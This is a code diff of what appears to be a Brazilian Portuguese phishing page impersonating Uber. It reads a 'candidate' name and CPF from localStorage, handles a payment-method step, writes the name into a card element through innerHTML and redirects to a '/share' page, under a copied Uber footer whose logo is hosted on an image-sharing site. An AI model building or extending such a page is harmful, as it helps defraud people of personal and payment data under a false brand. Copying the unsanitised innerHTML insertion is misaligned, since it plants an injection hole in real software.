@@ -286,17 +286,18 @@ let selectedPayment = null;
 // Load user data from localStorage
 document.addEventListener('DOMContentLoaded', function() {
     const userData = JSON.parse(localStorage.getItem('candidateData') || '{}');
-    const userInfoEl = document.getElementById('user-info');
     
     console.log('Dados recuperados do localStorage:', userData);
     
-    if (userData.name && userData.cpf) {
-        // Formatar CPF para exibição
-        const cpfFormatted = userData.cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.***.**$4');
-        userInfoEl.textContent = `${userData.name} - CPF: ${cpfFormatted}`;
-    } else {
-        userInfoEl.textContent = 'Dados não encontrados';
-        console.log('Dados não encontrados no localStorage');
+    // Update card name with user data
+    updateCardUserName(userData.name || localStorage.getItem('candidateName') || '');
+    
+    // Enable continue button
+    const continueBtn = document.getElementById('continue-btn');
+    if (continueBtn) {
+        continueBtn.disabled = false;
+        continueBtn.style.background = '#000 !important';
+        continueBtn.style.color = '#fff !important';
     }
 });
 
@@ -438,34 +439,80 @@ function disableContinueButton() {
     btn.style.color = '#666 !important';
 }
 
-function goDirectToAddress() {
-    if (!selectedPayment) {
-        alert('Por favor, selecione uma forma de pagamento.');
+// Function to update card user name
+function updateCardUserName(fullName) {
+    if (!fullName || fullName.trim() === '') {
+        console.log('No user name found in localStorage');
         return;
     }
-    
-    // Prevent multiple clicks
-    const btn = document.getElementById('continue-btn');
-    if (btn.hasAttribute('data-processing')) return;
-    btn.setAttribute('data-processing', 'true');
-    
-    // Save payment method to localStorage immediately
-    const paymentData = {
-        method: selectedPayment,
-        timestamp: new Date().toISOString()
-    };
-    
-    if (selectedPayment === 'pix') {
-        paymentData.pixType = document.getElementById('pix-type').value;
-        paymentData.pixKey = document.getElementById('pix-key').value;
+
+    try {
+        // Split name into parts and get first and last name
+        const nameParts = fullName.trim().split(' ');
+        let firstName = '';
+        let lastName = '';
+
+        if (nameParts.length === 1) {
+            firstName = nameParts[0];
+            lastName = '';
+        } else {
+            firstName = nameParts[0];
+            lastName = nameParts[nameParts.length - 1];
+        }
+
+        // Format name with uppercase and non-breaking space
+        const formattedName = `${firstName.toUpperCase()}${lastName ? `&nbsp;${lastName.toUpperCase()}` : ''}`;
+        
+        // Update the card element
+        const cardNameElement = document.getElementById('cardUserName');
+        if (cardNameElement) {
+            cardNameElement.innerHTML = formattedName;
+            console.log('Card name updated to:', formattedName);
+        }
+    } catch (error) {
+        console.error('Error updating card name:', error);
     }
-    
-    localStorage.setItem('paymentMethod', JSON.stringify(paymentData));
-    console.log('Payment method saved:', paymentData);
+}
+
+function goDirectToAddress() {
+    console.log('Redirecting to share page');
     
     // Immediate direct redirect - no loading screens
     location.href = '/share';
 }
 </script>
+
+          </div>
+          
+          <!-- Uber Footer -->
+          <footer class="w-full bg-black text-white pt-10 pb-6 px-4 mt-0">
+            <div class="max-w-[1100px] mx-auto">
+              <div class="flex flex-col md:flex-row md:justify-between md:items-start mb-8 space-y-8 md:space-y-0">
+                <div class="flex flex-col items-start space-y-4 md:space-y-6">
+                  <img src="https://i.ibb.co/0RR0HNC0/13093103960002-1.png" alt="Logo Uber estilizado em preto e branco, com fundo transparente" class="h-8 w-auto" style="max-height:32px;">
+                  <span class="text-white text-sm">© 2024 Uber Technologies Inc.</span>
+                </div>
+                <div class="flex flex-col md:flex-row md:space-x-16 space-y-6 md:space-y-0">
+                  <div class="flex flex-col space-y-2">
+                    <a class="text-white hover:underline text-base" href="#" style="color: #fff !important;">Privacidade</a>
+                    <a class="text-white hover:underline text-base" href="#" style="color: #fff !important;">Acessibilidade</a>
+                    <a class="text-white hover:underline text-base" href="#" style="color: #fff !important;">Termos</a>
+                  </div>
+                  <div class="flex flex-col space-y-2">
+                    <span class="text-white text-base" style="color: #fff !important;">Idioma</span>
+                    <span class="text-white text-base" style="color: #fff !important;">Português (Brasil)</span>
+                    <span class="text-white text-base" style="color: #fff !important;">Localização</span>
+                    <span class="text-white text-base" style="color: #fff !important;">Brasil</span>
+                  </div>
+                  <div class="flex flex-row items-center space-x-4 mt-4 md:mt-0">
+                    <a class="text-white text-2xl hover:text-gray-300 transition" href="#"><i class="fab fa-facebook-f"></i></a>
+                    <a class="text-white text-2xl hover:text-gray-300 transition" href="#"><i class="fab fa-twitter"></i></a>
+                    <a class="text-white text-2xl hover:text-gray-300 transition" href="#"><i class="fab fa-instagram"></i></a>
+                    <a class="text-white text-2xl hover:text-gray-300 transition" href="#"><i class="fab fa-youtube"></i></a>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </footer>
          </body>
         </html>
